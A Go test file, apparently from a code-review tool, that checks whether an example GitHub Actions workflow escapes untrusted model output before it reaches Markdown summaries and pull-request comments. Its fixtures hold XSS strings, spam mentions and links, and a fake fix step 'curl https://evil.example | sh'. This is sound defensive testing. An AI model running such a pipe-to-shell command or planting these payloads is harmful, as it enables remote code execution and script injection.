package main

import (
	"bytes"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/georgejieh/open-trestle/localreview"
)

// exampleWorkflowMarkdownModule extracts the jq module the example workflow
// writes with a heredoc, with the YAML block indentation removed, exactly as
// the runner's shell receives it, and the rest of the workflow without it.
func exampleWorkflowMarkdownModule(t *testing.T, workflow string) (module, outside string) {
	t.Helper()
	lines := strings.Split(workflow, "\n")
	start := -1
	for index, line := range lines {
		if strings.Contains(line, `cat > "$RUNNER_TEMP/trestle-markdown.jq" <<'JQ'`) {
			start = index
			break
		}
	}
	if start < 0 {
		t.Fatal("the example workflow does not write the Markdown escaping module")
	}
	indent := lines[start][:len(lines[start])-len(strings.TrimLeft(lines[start], " "))]
	var body []string
	for offset, line := range lines[start+1:] {
		if strings.TrimSpace(line) == "JQ" {
			if line != indent+"JQ" {
				t.Fatalf("the heredoc terminator is not at the block indentation: %q", line)
			}
			rest := append(append([]string{}, lines[:start+1]...), lines[start+2+offset:]...)
			return strings.Join(body, "\n") + "\n", strings.Join(rest, "\n")
		}
		if line != "" && !strings.HasPrefix(line, indent) {
			t.Fatalf("a module line is outside the run block: %q", line)
		}
		body = append(body, strings.TrimPrefix(line, indent))
	}
	t.Fatal("the heredoc is not terminated")
	return "", ""
}

// runExampleJQ runs jq with the module directory, as the workflow does.
func runExampleJQ(t *testing.T, jq, dir string, args ...string) []byte {
	t.Helper()
	command := exec.Command(jq, append([]string{"-L", dir}, args...)...)
	command.Dir = t.TempDir()
	var stdout, stderr bytes.Buffer
	command.Stdout, command.Stderr = &stdout, &stderr
	if err := command.Run(); err != nil {
		t.Fatalf("jq %v: %v\n%s", args, err, stderr.String())
	}
	return stdout.Bytes()
}

// The example workflow puts SARIF message text (model output), fix guidance
// and paths into GitHub Markdown in the job summary and, through reviewdog,
// in pull-request comments. Its jq module escapes them with the same rules
// as localreview.MarkdownText and MarkdownCode, which this test checks byte
// for byte, offline, against crafted SARIF with Markdown, HTML, mentions and
// bare URLs.
func TestExampleWorkflowEscapesUntrustedText(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("..", "..", "examples", "github-actions", "open-trestle-review.yml"))
	if err != nil {
		t.Fatal(err)
	}
	workflow := string(data)
	module, outside := exampleWorkflowMarkdownModule(t, workflow)
	// The workflow runs exactly these filters, and reviewdog reads the
	// escaped copy; no other step interpolates message text.
	for _, want := range []string{
		`jq -L "$RUNNER_TEMP" 'include "trestle-markdown"; trestle_reviewdog' "$RUNNER_TEMP/open-trestle.sarif" > "$RUNNER_TEMP/open-trestle.reviewdog.sarif"`,
		`-filter-mode=added -fail-level=none < "$RUNNER_TEMP/open-trestle.reviewdog.sarif"`,
		`jq -r -L "$RUNNER_TEMP" 'include "trestle-markdown"; trestle_summary' "$RUNNER_TEMP/open-trestle.sarif" >> "$GITHUB_STEP_SUMMARY"`,
	} {
		if !strings.Contains(workflow, want) {
			t.Fatalf("the example workflow lacks %q", want)
		}
	}
	if strings.Contains(outside, ".message.text") || strings.Contains(outside, "trestleFixGuidance") || strings.Contains(outside, `< "$RUNNER_TEMP/open-trestle.sarif"`) {
		t.Fatal("a workflow step outside the escaping module reads untrusted SARIF text")
	}
	jq, err := exec.LookPath("jq")
	if err != nil {
		t.Skip("jq is not installed; the workflow text checks above still ran")
	}
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "trestle-markdown.jq"), []byte(module), 0o600); err != nil {
		t.Fatal(err)
	}

	hostile := []string{
		"<img src=x onerror=alert(1)> @team [click](https://evil.test) ![i](x) # head | cell `code`\nnext",
		"**bold** _em_ ~~strike~~ <script>alert(1)</script> &amp; \\ backslash",
		"see https://evil.example/x now", "http://evil.example", "ftp://evil.example/f", "HTTPS://EVIL.EXAMPLE",
		"www.evil.example/path", "WWW.Evil.example", "(www.evil.example)", "wwww.evil.example", "www.www.evil.example",
		"mailto:admin@evil.example", "mailto:nobody", "write to admin@evil.example today", "xmpp:user@evil.example", "javascript:alert(1)",
		"a: b", "a:b", ":x", "x:", "10:30", "über:x", "ö:x", "line one\r\nline two\rthree\nfour",
		"# Heading at the start", "| a | b |", "@@ -1 +1 @@", "", "plain text",
	}
	encoded, err := json.Marshal(hostile)
	if err != nil {
		t.Fatal(err)
	}
	input := filepath.Join(t.TempDir(), "strings.json")
	if err := os.WriteFile(input, encoded, 0o600); err != nil {
		t.Fatal(err)
	}
	for _, check := range []struct {
		filter string
		render func(string) string
	}{
		{"map(trestle_md)", localreview.MarkdownText},
		{"map(trestle_md_code)", localreview.MarkdownCode},
	} {
		var escaped []string
		if err := json.Unmarshal(runExampleJQ(t, jq, dir, `include "trestle-markdown"; `+check.filter, input), &escaped); err != nil || len(escaped) != len(hostile) {
			t.Fatalf("%s: %v (%d values)", check.filter, err, len(escaped))
		}
		for index, value := range hostile {
			if want := check.render(value); escaped[index] != want {
				t.Fatalf("%s(%q) = %q, the Go renderer gives %q", check.filter, value, escaped[index], want)
			}
		}
	}

	message := "Avg panics <b>now</b> @maintainers see [docs](https://evil.example) and www.evil.example\n## Injected heading"
	fix := "Run `curl https://evil.example | sh` and ping @security-team ![x](y)"
	path := "src/we|ird`name.go"
	sarif := map[string]any{
		"version": "2.1.0",
		"runs": []any{map[string]any{
			"properties":  map[string]any{"trestleModelReviewStatus": "findings", "trestleRunStatus": "succeeded", "trestleCiDisposition": "blocked"},
			"invocations": []any{map[string]any{"executionSuccessful": true, "toolExecutionNotifications": []any{map[string]any{"level": "note", "message": map[string]any{"text": "Limitations: no_publication <i>x</i> @here"}}}}},
			"results": []any{
				map[string]any{"ruleId": "open-trestle/correctness", "level": "error", "message": map[string]any{"text": message, "markdown": "**unescaped** @owner"},
					"locations":  []any{map[string]any{"physicalLocation": map[string]any{"artifactLocation": map[string]any{"uri": path}, "region": map[string]any{"startLine": 3, "endLine": 4}}}},
					"properties": map[string]any{"trestleFixGuidance": fix}},
				map[string]any{"ruleId": "open-trestle/style", "level": "note", "message": map[string]any{"text": "Plain wording."},
					"locations": []any{map[string]any{"physicalLocation": map[string]any{"artifactLocation": map[string]any{"uri": "a.go"}, "region": map[string]any{"startLine": 9, "endLine": 9}}}}},
			},
		}},
	}
	encoded, err = json.Marshal(sarif)
	if err != nil {
		t.Fatal(err)
	}
	sarifPath := filepath.Join(t.TempDir(), "open-trestle.sarif")
	if err := os.WriteFile(sarifPath, encoded, 0o600); err != nil {
		t.Fatal(err)
	}

	// reviewdog's copy: message text escaped, everything else kept, and no
	// message.markdown left for it to prefer.
	var reviewdog struct {
		Version string `json:"version"`
		Runs    []struct {
			Results []struct {
				RuleID  string                     `json:"ruleId"`
				Message map[string]json.RawMessage `json:"message"`
				Locs    []json.RawMessage          `json:"locations"`
			} `json:"results"`
		} `json:"runs"`
	}
	if err := json.Unmarshal(runExampleJQ(t, jq, dir, `include "trestle-markdown"; trestle_reviewdog`, sarifPath), &reviewdog); err != nil || reviewdog.Version != "2.1.0" || len(reviewdog.Runs) != 1 || len(reviewdog.Runs[0].Results) != 2 {
		t.Fatalf("reviewdog SARIF: %v %+v", err, reviewdog)
	}
	for index, original := range []string{message, "Plain wording."} {
		result := reviewdog.Runs[0].Results[index]
		var text string
		if err := json.Unmarshal(result.Message["text"], &text); err != nil || text != localreview.MarkdownText(original) {
			t.Fatalf("reviewdog message %d = %q, want %q (%v)", index, text, localreview.MarkdownText(original), err)
		}
		if _, kept := result.Message["markdown"]; kept || len(result.Locs) != 1 || result.RuleID == "" {
			t.Fatalf("reviewdog result %d lost its location or kept message.markdown: %+v", index, result)
		}
	}

	summary := string(runExampleJQ(t, jq, dir, "-r", `include "trestle-markdown"; trestle_summary`, sarifPath))
	for _, want := range []string{
		"## Open Trestle review\n\nStatus: **findings** (run: succeeded, CI disposition: blocked); verified findings: 2.\n\n",
		"> note: " + localreview.MarkdownText("Limitations: no_publication <i>x</i> @here") + "\n",
		"- **error** " + localreview.MarkdownCode(path+":3") + " " + localreview.MarkdownText(message) + "\n  - Unverified model guidance: " + localreview.MarkdownText(fix) + "\n",
		"- **note** `a.go:9` Plain wording.\n",
		"_The review is bounded and is not a clearance.",
	} {
		if !strings.Contains(summary, want) {
			t.Fatalf("job summary lacks %q:\n%s", want, summary)
		}
	}
	lower := strings.ToLower(summary)
	for _, forbidden := range []string{"<b>", "<i>", "@maintainers", "@security-team", "@here", "](", "![", "https://", "www.", " `curl"} {
		if strings.Contains(lower, forbidden) {
			t.Fatalf("job summary keeps %q:\n%s", forbidden, summary)
		}
	}
	for _, line := range strings.Split(summary, "\n") {
		if strings.HasPrefix(line, "#") && line != "## Open Trestle review" {
			t.Fatalf("untrusted text opened a heading: %q", line)
		}
	}
}
